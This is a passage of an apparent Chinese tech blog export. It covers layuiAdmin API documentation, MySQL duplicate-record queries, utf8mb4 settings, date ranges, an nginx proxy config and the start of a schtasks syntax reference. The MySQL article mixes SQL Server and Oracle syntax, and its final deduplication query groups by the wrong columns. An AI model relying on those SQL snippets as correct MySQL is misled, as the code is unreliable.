<p>事实上，layuiAdmin 的所有 Ajax 请求都是采用 <code>admin.req(options)</code>，它会自动传递 <code>access_token</code>，因此推荐你在 JS 执行 Ajax 请求时直接使用它。其中参数 <em>options</em> 和 <code>$.ajax(options)</code> 的参数完全一样。</p>
<h4 id="接口鉴权"><a href="#接口鉴权" class="headerlink" title="接口鉴权"></a>接口鉴权</h4><p>我们推荐服务端遵循 <strong>JWT</strong>（JSON Web Token） 标准进行鉴权。对 JWT 不甚了解的同学，可以去搜索一些相关资料，会极大地增加应用的可扩展性。当然，你也可以直接采用传统的 cookie / session 机制。</p>
<h3 id="基础方法"><a href="#基础方法" class="headerlink" title="基础方法"></a>基础方法</h3><ul>
<li><strong>config 模块</strong></li>
</ul>
<blockquote>
<p>你可以在任何地方通过 <code>layui.setter</code> 得到 <em>config.js</em> 中的配置信息</p>
</blockquote>
<ul>
<li><strong>admin 模块</strong></li>
</ul>
<blockquote>
<p>var admin = layui.admin;</p>
</blockquote>
<ul>
<li><p><strong>admin.req(options)</strong><br>Ajax 请求，用法同 $.ajax(options)，只是该方法会进行错误处理和 token 的自动传递</p>
</li>
<li><p><strong>admin.screen()</strong><br>获取屏幕类型，根据当前屏幕大小，返回 0 - 3 的值<br>0: 低于768px的屏幕<br>1：768px到992px之间的屏幕<br>2：992px到1200px之间的屏幕<br>3：高于1200px的屏幕</p>
</li>
<li><p><strong>admin.exit()</strong><br>清除本地 token，并跳转到登入页</p>
</li>
<li><p><strong>admin.sideFlexible(status)</strong><br>侧边伸缩。status 为 null：收缩；status为 “spread”：展开</p>
</li>
<li><p><strong>admin.on(eventName, callback)</strong><br>事件监听，下文会有讲解</p>
</li>
<li><p><strong>admin.popup(options)</strong><br>弹出一个 layuiAdmin 主题风格的 layer 层，参数 options 跟 layer.open(options) 完全相同</p>
</li>
<li><p><strong>admin.popupRight(options)</strong><br>在屏幕右侧呼出一个面板层。options 同上。</p>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">admin.popupRight(&#123;</span><br><span class="line">    id: <span class="string">'LAY-popup-right-new1'</span> <span class="comment">//定义唯一ID，防止重复弹出</span></span><br><span class="line">    ,<span class="attr">success</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//将 views 目录下的某视图文件内容渲染给该面板</span></span><br><span class="line">    layui.view(<span class="keyword">this</span>.id).render(<span class="string">'视图文件所在路径'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong>admin.resize(callback)</strong><br>窗口 resize 事件处理，我们推荐你使用该方法取代 jQuery 的 resize 事件，以避免多页面标签下可能存在的冲突。</p>
</li>
<li><p><strong>admin.events</strong></p>
<ul>
<li><p>admin.events.refresh()<br>刷新当前右侧区域</p>
</li>
<li><p>admin.events.closeThisTabs()<br>关闭当前标签页</p>
</li>
<li><p>admin.events.closeOtherTabs()<br>关闭其它标签页</p>
</li>
<li><p>admin.events.closeAllTabs()<br>关闭全部标签页</p>
</li>
</ul>
</li>
</ul>
<ul>
<li><strong>view 模块</strong></li>
</ul>
<blockquote>
<p>var view = layui.view;</p>
</blockquote>
<ul>
<li><strong>view(id)</strong><br>获取指定容器，并返回一些视图渲染的方法，如：</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//渲染视图，viewPath 即为视图路径</span></span><br><span class="line">view(<span class="string">'#id'</span>).render(viewPath).then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="comment">//视图文件请求完毕，视图内容渲染前的回调</span></span><br><span class="line">&#125;).done(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="comment">//视图文件请求完毕和内容渲染完毕的回调</span></span><br><span class="line">&#125;); </span><br><span class="line"></span><br><span class="line"><span class="comment">//直接向容器插入 html，tpl 为 模板字符；data 是传入的数据。该方法会自动完成动态模板解析</span></span><br><span class="line">view(<span class="string">'#id'</span>).send(tpl, data);</span><br></pre></td></tr></table></figure>

<p>另外，<code>render</code> 方法支持动态传参，以用于视图内容接受。如：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">admin.popup(&#123;</span><br><span class="line">    id: <span class="string">'LAY-popup-test1'</span></span><br><span class="line">    ,<span class="attr">success</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    view(<span class="keyword">this</span>.id).render(<span class="string">'视图文件所在路径'</span>, &#123;</span><br><span class="line">            id: <span class="number">123</span> <span class="comment">//这里的 id 值你可以在一些事件中动态获取（如 table 模块的编辑）</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>那么，在视图文件中，你可以在动态模板中通过 <code>\{\{ d.params.xxx \}\}</code> 得到传入的参数，如：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/html"</span> template lay-url=<span class="string">"http://api.com?id=&#123;&#123; d.params.id &#125;&#125;"</span>&gt;</span><br><span class="line">配置了接口的动态模板，且接口动态获取了 render 传入的参数：&#123;&#123; d.params.id &#125;&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;script type="text/</span>html<span class="string">" template&gt;</span></span><br><span class="line"><span class="string">也可以直接获取：&lt;input type="</span>hidden<span class="string">" name="</span>id<span class="string">" value="</span>&#123;&#123; d.params.id &#125;&#125;<span class="string">"&gt;</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>而如果是在 JS 语句中去获取模板传递过来的变量，可以借助动态模板的 lay-done 属性去实现，如：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/html"</span> <span class="attr">template</span> <span class="attr">lay-done</span>=<span class="string">"layui.data.sendParams(d.params)"</span>&gt;</span></span><br><span class="line">  </span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后在 JS 语句中通过执行动态模板 lay-done 中对应的方法得到对应的参数值：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="comment">//定义一个 lay-done 对应的全局方法，以供动态模板执行</span></span></span><br><span class="line"><span class="javascript">layui.data.sendParams = <span class="function"><span class="keyword">function</span>(<span class="params">params</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">  <span class="built_in">console</span>.log(params.id) <span class="comment">//得到传递过来的 id 参数（或其他参数）值</span></span></span><br><span class="line">  </span><br><span class="line"><span class="javascript">  <span class="comment">//通过得到的参数值，做一些你想做的事</span></span></span><br><span class="line"><span class="javascript">  <span class="comment">//…</span></span></span><br><span class="line"> </span><br><span class="line"><span class="javascript">  <span class="comment">//若需用到 layui 组件，layui.use 需写在该全局方法里面，如：</span></span></span><br><span class="line"><span class="javascript">  layui.use([<span class="string">'table'</span>], <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> table = layui.table;</span></span><br><span class="line">    table.render(&#123;</span><br><span class="line"><span class="javascript">      elem: <span class="string">''</span></span></span><br><span class="line"><span class="javascript">      ,<span class="attr">url</span>: <span class="string">'url?id='</span>+ params.id</span></span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意：上述实现需保证 layuiAdmin 为 1.2.0+`</p>
</blockquote>
<p>总之，驾驭好 <code>view().render().done(callback)</code> 对您的项目开发至关重要。</p>
<h3 id="ID唯一性"><a href="#ID唯一性" class="headerlink" title="ID唯一性"></a>ID唯一性</h3><p>如果你开启了标签页功能，请务必注意 ID 的冲突，尤其是在你自己绑定事件的情况。ID 的命令可以遵循以下规则来规避冲突：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LAY-路由-任意名</span><br></pre></td></tr></table></figure>

<p>以_消息中心_页面为例，假设它的路由为：<code>/app/message/</code>，那么 ID 应该命名为：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"layui-btn"</span> <span class="attr">id</span>=<span class="string">"LAY-app-message-del"</span>&gt;</span>删除<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="实用组件"><a href="#实用组件" class="headerlink" title="实用组件"></a>实用组件</h3><h4 id="Hover-提示层"><a href="#Hover-提示层" class="headerlink" title="Hover 提示层"></a>Hover 提示层</h4><p>通过对元素设置 <code>lay-tips=&quot;提示内容&quot;</code> 来开启一个 hover 提示，如：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"layui-icon layui-icon-tips"</span> <span class="attr">lay-tips</span>=<span class="string">"要支持的噢"</span> <span class="attr">lay-offset</span>=<span class="string">"5"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>其中 <code>lay-offset</code> 用于定于水平偏移距离（单位px），以调整箭头让其对准元素</p>
<h3 id="事件监听"><a href="#事件监听" class="headerlink" title="事件监听"></a>事件监听</h3><ul>
<li><strong>hash</strong><br>监听路由地址改变</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 下述中的 xxx 可随意定义，不可与已经定义的 hash 事件同名，否则会覆盖上一事件</span></span><br><span class="line">admin.on(<span class="string">'hash(xxx)'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">router</span>)</span>&#123;</span><br><span class="line">     <span class="built_in">console</span>.log(router); <span class="comment">//得到路由信息</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>side</strong><br>监听侧边伸缩</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 下述中的 xxx 可随意定义，不可与已经定义的 side 事件同名，否则会覆盖上一事件</span></span><br><span class="line">admin.on(<span class="string">'side(xxx)'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">     <span class="built_in">console</span>.log(obj.status); <span class="comment">//得到伸缩状态：spread 为展开状态，其它值为收缩状态</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h3 id="兼容性"><a href="#兼容性" class="headerlink" title="兼容性"></a>兼容性</h3><p>layuiAdmin 使用到了 layui 的栅格系统，而栅格则是基于浏览器的媒体查询。ie8、9不支持。  所以要在宿主页面（如 start/index.html ）加上下面这段保证兼容：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 让IE8/9支持媒体查询，从而兼容栅格 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!--[if lt IE 9]&gt;</span></span><br><span class="line"><span class="comment">&lt;script src="https://cdn.staticfile.org/html5shiv/r29/html5.min.js"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="comment">&lt;script src="https://cdn.staticfile.org/respond.js/1.4.2/respond.min.js"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="comment">&lt;![endif]--&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="缓存问题"><a href="#缓存问题" class="headerlink" title="缓存问题"></a>缓存问题</h3><p>由于单页面版本的视图文件和静态资源模块都是动态加载的，所以可能存在浏览器的本地缓存问题，事实上我们也考虑到这个，因此，为了避免改动后的文件未及时生效，你只需在入口页面（默认为start/index.html）中，找到 layui.config，修改其 version 的值即可。</p>
<p>我们推荐你分场景来更新缓存：</p>
<ul>
<li>场景一：如果项目是在本地开发。你可以设置 version 为动态毫秒数，如：</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">version: <span class="keyword">new</span> <span class="built_in">Date</span>().getTime() <span class="comment">//这样你每次刷新页面，都会更新一次缓存</span></span><br></pre></td></tr></table></figure>

<ul>
<li>场景二：如果项目是在线上运行。建议你手工更新 version，如：</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">version: <span class="string">'1.0.0'</span> <span class="comment">//每次发布项目时，跟着改动下该属性值即可更新静态资源的缓存</span></span><br></pre></td></tr></table></figure>

<h3 id="升级事项"><a href="#升级事项" class="headerlink" title="升级事项"></a>升级事项</h3><p>从官网更新资源包后，除了 src 和 dist 目录需要注意一下，其它目录和文件均可覆盖，下面以 src 为例（dist 由于是 src 构建后生成的目录，所以本质是和 src 一样的）  </p>
<p><strong>src 目录下可以直接覆盖的有</strong>：</p>
<blockquote>
<ul>
<li>src/lib/</li>
<li>src/style/</li>
<li>src/index.js</li>
</ul>
</blockquote>
<p><strong>需要灵活调配的有</strong>：</p>
<blockquote>
<ul>
<li>src/controller/</li>
<li>src/views/</li>
<li>src/config.js<br>如果没有改动默认配置，事实上 config.js 也可以覆盖升级</li>
</ul>
</blockquote>
<p>开发过程中，建议同时运行两个 layuiAdmin 。一个是已经实际运用的，一个是 layuiAdmin 本身的 Demo。以便从 Demo 中获取参考和提取示例。</p>
<h3 id="源码构建"><a href="#源码构建" class="headerlink" title="源码构建"></a>源码构建</h3><p>当你在 src 目录完成开发后，你可通过 gulp 对 src 源码进行自动化构建，以生成用于线上环境的 dist 目录。<br>其中，gulpfile.js 是 layuiAdmin 写好的任务脚本，package.json 是任务配置文件，你只需按照以下步骤：</p>
<ul>
<li>step1：确保你的电脑已经安装好了 <a href="https://nodejs.org/en/" target="_blank" rel="noopener">Node.js</a>，如果未安装，可去官网下载安装<a href="https://nodejs.org/en/" target="_blank" rel="noopener">传送门</a></li>
<li>step2: 命令行安装 gulp：npm install gulp -g</li>
<li>step3：切换到 layuiAdmin 项目根目录（即 gulpfile.js 所在目录），命令行安装任务所依赖的包：npm install</li>
</ul>
<p>安装完成后，后续只需直接执行命令：<code>gulp</code> 即可完成 src 到 dist 目录的构建</p>
<h3 id="关于版权"><a href="#关于版权" class="headerlink" title="关于版权"></a>关于版权</h3><blockquote>
<p>layuiAdmin 受国家计算机软件著作权保护，未经官网正规渠道授权擅自公开产品源文件、以及直接对产品二次出售的，我们将追究相应的法律责任。</p>
</blockquote>
<p>获取官方正版授权： <a href="https://www.layui.com/admin/" target="_blank" rel="noopener">传送门</a></p>
]]></content>
      <categories>
        <category>前端开发</category>
      </categories>
      <tags>
        <tag>ui - layuiadmin</tag>
      </tags>
  </entry>
  <entry>
    <title>mysql 查询重复数据</title>
    <url>/articles/mysql%20%E6%9F%A5%E8%AF%A2%E9%87%8D%E5%A4%8D%E6%95%B0%E6%8D%AE/</url>
    <content><![CDATA[<p>本文主要介绍关于MySQL中查询、删除重复记录的方法，下面是详细的介绍：</p>
<ul>
<li>查找所有重复标题的记录</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> title,<span class="keyword">count</span>(*) <span class="keyword">as</span> <span class="keyword">count</span> <span class="keyword">from</span> user_table <span class="keyword">group</span> <span class="keyword">by</span> title <span class="keyword">having</span> <span class="keyword">count</span>&gt;<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> t_info a <span class="keyword">WHERE</span> ((<span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*) <span class="keyword">FROM</span> t_info <span class="keyword">WHERE</span> Title = a.Title) &gt; <span class="number">1</span>) <span class="keyword">ORDER</span> <span class="keyword">BY</span> Title <span class="keyword">DESC</span></span><br></pre></td></tr></table></figure>

<ul>
<li>查找全部重复记录</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> t_info a <span class="keyword">WHERE</span> ((<span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*) <span class="keyword">FROM</span> t_info <span class="keyword">WHERE</span> Title = a.Title) &gt; <span class="number">1</span>) <span class="keyword">ORDER</span> <span class="keyword">BY</span> Title <span class="keyword">DESC</span></span><br></pre></td></tr></table></figure>

<ul>
<li>过滤重复记录(只显示一条)</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Select</span> * <span class="keyword">From</span> HZT <span class="keyword">Where</span> <span class="keyword">ID</span> <span class="keyword">In</span> (<span class="keyword">Select</span> <span class="keyword">Max</span>(<span class="keyword">ID</span>) <span class="keyword">From</span> HZT <span class="keyword">Group</span> <span class="keyword">By</span> Title)</span><br></pre></td></tr></table></figure>

<p><code>注：此处显示ID最大一条记录</code></p>
<ul>
<li>删除全部重复记录（慎用）</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Delete</span> 表 <span class="keyword">Where</span> 重复字段 <span class="keyword">In</span> (<span class="keyword">Select</span> 重复字段 <span class="keyword">From</span> 表 <span class="keyword">Group</span> <span class="keyword">By</span> 重复字段 <span class="keyword">Having</span> <span class="keyword">Count</span>(*)&gt;<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>保留一条</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Delete</span> HZT <span class="keyword">Where</span> <span class="keyword">ID</span> <span class="keyword">Not</span> <span class="keyword">In</span> (<span class="keyword">Select</span> <span class="keyword">Max</span>(<span class="keyword">ID</span>) <span class="keyword">From</span> HZT <span class="keyword">Group</span> <span class="keyword">By</span> Title)</span><br></pre></td></tr></table></figure>

<p>注：此处保留ID最大一条记录</p>
<p>###举例</p>
<p>1、查找表中多余的重复记录，重复记录是根据单个字段（peopleId）来判断</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> people <span class="keyword">where</span> peopleId <span class="keyword">in</span> (<span class="keyword">select</span> peopleId <span class="keyword">from</span> people <span class="keyword">group</span> <span class="keyword">by</span> peopleId <span class="keyword">having</span> <span class="keyword">count</span>(peopleId) &gt; <span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>2、删除表中多余的重复记录，重复记录是根据单个字段（peopleId）来判断，只留有rowid最小的记录</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> people <span class="keyword">where</span> peopleId <span class="keyword">in</span> (<span class="keyword">select</span> peopleId <span class="keyword">from</span> people <span class="keyword">group</span> <span class="keyword">by</span> peopleId <span class="keyword">having</span> <span class="keyword">count</span>(peopleId) &gt; <span class="number">1</span>) <span class="keyword">and</span> <span class="keyword">rowid</span> <span class="keyword">not</span> <span class="keyword">in</span> (<span class="keyword">select</span> <span class="keyword">min</span>(<span class="keyword">rowid</span>) <span class="keyword">from</span> people <span class="keyword">group</span> <span class="keyword">by</span> peopleId <span class="keyword">having</span> <span class="keyword">count</span>(peopleId )&gt;<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>3、查找表中多余的重复记录（多个字段）</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> vitae a <span class="keyword">where</span> (a.peopleId,a.seq) <span class="keyword">in</span> (<span class="keyword">select</span> peopleId,seq <span class="keyword">from</span> vitae <span class="keyword">group</span> <span class="keyword">by</span> peopleId,seq <span class="keyword">having</span> <span class="keyword">count</span>(*) &gt; <span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>4、删除表中多余的重复记录（多个字段），只留有rowid最小的记录</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> vitae a <span class="keyword">where</span> (a.peopleId,a.seq) <span class="keyword">in</span> (<span class="keyword">select</span> peopleId,seq <span class="keyword">from</span> vitae <span class="keyword">group</span> <span class="keyword">by</span> peopleId,seq <span class="keyword">having</span> <span class="keyword">count</span>(*) &gt; <span class="number">1</span>) <span class="keyword">and</span> <span class="keyword">rowid</span> <span class="keyword">not</span> <span class="keyword">in</span> (<span class="keyword">select</span> <span class="keyword">min</span>(<span class="keyword">rowid</span>) <span class="keyword">from</span> vitae <span class="keyword">group</span> <span class="keyword">by</span> peopleId,seq <span class="keyword">having</span> <span class="keyword">count</span>(*)&gt;<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>5、查找表中多余的重复记录（多个字段），不包含rowid最小的记录</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> vitae a <span class="keyword">where</span> (a.peopleId,a.seq) <span class="keyword">in</span> (<span class="keyword">select</span> peopleId,seq <span class="keyword">from</span> vitae <span class="keyword">group</span> <span class="keyword">by</span> peopleId,seq <span class="keyword">having</span> <span class="keyword">count</span>(*) &gt; <span class="number">1</span>) <span class="keyword">and</span> <span class="keyword">rowid</span> <span class="keyword">not</span> <span class="keyword">in</span> (<span class="keyword">select</span> <span class="keyword">min</span>(<span class="keyword">rowid</span>) <span class="keyword">from</span> vitae <span class="keyword">group</span> <span class="keyword">by</span> peopleId,seq <span class="keyword">having</span> <span class="keyword">count</span>(*)&gt;<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p><code>补充</code></p>
<p>有两个以上的重复记录，一是完全重复的记录，也即所有字段均重复的记录，二是部分关键字段重复的记录，比如Name字段重复，而其他字段不一定重复或都重复可以忽略。</p>
<p>1、对于第一种重复，比较容易解决，使用</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> * <span class="keyword">from</span> tableName</span><br></pre></td></tr></table></figure>

<p>就可以得到无重复记录的结果集。</p>
<p>如果该表需要删除重复的记录（重复记录保留1条），可以按以下方法删除</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> * <span class="keyword">into</span> <span class="comment">#Tmp from tableName</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> tableName</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">into</span> tableName <span class="keyword">from</span> <span class="comment">#Tmp</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="comment">#Tmp</span></span><br></pre></td></tr></table></figure>

<p>发生这种重复的原因是表设计不周产生的，增加唯一索引列即可解决。</p>
<p>2、这类重复问题通常要求保留重复记录中的第一条记录，操作方法如下</p>
<p>假设有重复的字段为Name,Address，要求得到这两个字段唯一的结果集</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">identity</span>(<span class="built_in">int</span>,<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">as</span> autoID, * <span class="keyword">into</span> <span class="comment">#Tmp from tableName</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">min</span>(autoID) <span class="keyword">as</span> autoID <span class="keyword">into</span> <span class="comment">#Tmp2 from #Tmp group by Name,autoID</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="comment">#Tmp where autoID in(select autoID from #tmp2)</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title>mysql支持emoji表情</title>
    <url>/articles/mysql%E6%94%AF%E6%8C%81emoji%E8%A1%A8%E6%83%85/</url>
    <content><![CDATA[<p>数据库</p>
<p>字段 Character set 设置为 utf8mb4 ,  Collation 设置为 utf8mb4_unicode_ci</p>
<p>数据库连接</p>
<p>‘charset’ =&gt; ‘utf8mb4’,</p>
<p>‘collation’ =&gt; ‘utf8mb4_unicode_ci’,</p>
]]></content>
  </entry>
  <entry>
    <title>mysql常见时间格式</title>
    <url>/articles/mysql%E5%B8%B8%E8%A7%81%E6%97%B6%E9%97%B4%E6%A0%BC%E5%BC%8F/</url>
    <content><![CDATA[<p>DATE  范围 ‘1000-01-01’ to ‘9999-12-31’</p>
<p>DATETIME  范围 ‘1000-01-01 00:00:00’ to ‘9999-12-31 23:59:59’</p>
<p>TIMESTAMP 范围   ‘1970-01-01 00:00:01’ UTC to ‘2038-01-19 03:14:07’ UTC</p>
<p>注： 如果当前时间字段不做查询， 可以直接存储为字符串。</p>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title>linux代理</title>
    <url>/articles/linux%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<p>nginx.conf 文件：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">listen</span>       <span class="number">80</span>;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">server_name</span>  job.easysq.cn;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">proxy_set_header</span> X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">proxy_set_header</span> X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">proxy_set_header</span> X-Nginx-Proxy <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">proxy_set_header</span> Connection <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">proxy_pass</span> http://127.0.0.1:3003/;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title>Schtasks命令详解(计划任务DOS批处理)</title>
    <url>/articles/Schtasks%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3-%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1DOS%E6%89%B9%E5%A4%84%E7%90%86-/</url>
    <content><![CDATA[<p>安排命令和程序定期运行或在指定时间内运行。从计划表中添加和删除任务，按需要启动和停止任务，显示和更改计划任务。</p>
<h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">schtasks /create /tn TaskName /tr TaskRun /sc schedule [/momodifier] [/dday] [/mmonth[,month...] [/iIdleTime] [/stStartTime] [/sdStartDate] [/edEndDate] [/scomputer[/u[domain\]user/ppassword]][/ru&#123;[Domain\]User|"System"&#125; [/rpPassword]] /?</span><br></pre></td></tr></table></figure>

<h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><p><code>/tn</code> TaskName  指定任务的名称。</p>
<p><code>/tr</code> TaskRun   指定任务运行的程序或命令。键入可执行文件、脚本文件或批处理文件的完全合格的路径和文件名。如果忽略该路径，SchTasks.exe 将假定文件在Systemroot\System32 目录下。</p>
<p><code>/sc</code> schedule  指定计划类型。有效值为 MINUTE、HOURLY、DAILY、WEEKLY、MONTHLY、ONCE、ONSTART、ONLOGON、ONIDLE。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">有效值说明</span><br><span class="line"></span><br><span class="line">MINUTE、HOURLY、DAILY、WEEKLY、MONTHLY  指定计划的时间单位。</span><br><span class="line"></span><br><span class="line">ONCE    任务在指定的日期和时间运行一次。</span><br><span class="line"></span><br><span class="line">ONSTART 任务在每次系统启动的时候运行。可以指定启动的日期，或下一次系统启动的时候运行任务。</span><br><span class="line"></span><br><span class="line">ONLOGON 每当用户（任意用户）登录的时候，任务就运行。可以指定日期，或在下次用户登录的时候运行任务。</span><br><span class="line"></span><br><span class="line">ONIDLE  只要系统空闲了指定的时间，任务就运行。可以指定日期，或在下次系统空闲的时候运行任务。</span><br></pre></td></tr></table></figure>

<p><code>/mo</code> modifier 指定任务在其计划类型内的运行频率。这个参数对于 MONTHLY 计划是必需的。对于 MINUTE、HOURLY、DAILY 或 WEEKLY 计划，这个参数有效，但也可选。默认值为 1。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">参数说明</span><br><span class="line"></span><br><span class="line">MINUTE  1～1439  任务每n分钟运行一次。</span><br><span class="line"></span><br><span class="line">HOURLY  1～23    任务每n小时运行一次。</span><br><span class="line"></span><br><span class="line">`DAILY   1～365   任务每n天运行一次。</span><br><span class="line"></span><br><span class="line">WEEKLY  1～52    任务每n周运行一次。</span><br><span class="line"></span><br><span class="line">MONTHLY 1～12    任务每n月运行一次。</span><br><span class="line"></span><br><span class="line">LASTDAY 任务在月份的最后一天运行。</span><br><span class="line"></span><br><span class="line">FIRST、SECOND、THIRD、FOURTH、LAST 与 `/d day` 参数共同使用,并在特定的周和天运行任务。例如，在月份的第三个周三。</span><br></pre></td></tr></table></figure>

<p><code>/d</code> dirlist 指定周或月的一天。只与 WEEKLY 或 MONTHLY 计划共同使用时有效。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">计划类型 </span><br><span class="line"></span><br><span class="line">WEEKLY   可选项。有效值是 MON ~ SUN 和 * （每一天）。MON 是默认值。</span><br><span class="line"></span><br><span class="line">MONTHLY  在使用 FIRST、SECOND、THIRD、FOURTH 或 LAST 修饰符 (/mo) 时，需要 MON ～ SUN 中的某个值。1 ～ 31 是可选的，只在没有修饰符或修饰符为1 ～ 12类型时有效。默认值是 1 （月份的第一天）。</span><br></pre></td></tr></table></figure>

